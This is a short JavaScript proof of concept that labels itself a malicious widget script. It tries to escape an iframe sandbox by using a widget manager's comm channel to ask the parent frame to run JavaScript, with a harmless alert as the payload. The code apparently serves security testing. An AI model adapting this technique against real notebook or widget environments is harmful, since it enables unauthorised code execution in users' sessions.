(function() {
    console.log("Malicious widget script loaded.");

    const widgetManager = window.widget_manager || null;
    if (widgetManager) {
        widgetManager.get_model('arbitrary-id').then(model => {
            if (model && model.comm && model.comm.host) {
                console.log("Accessing parent frame...");
                model.comm.host.sendMessage('arbitrary_action', {
                    javascript_to_execute_in_parent: 'alert("Iframe Escaped!")'
                });
            }
        });
    } else {
        console.error("Widget manager not accessible.");
    }
})();
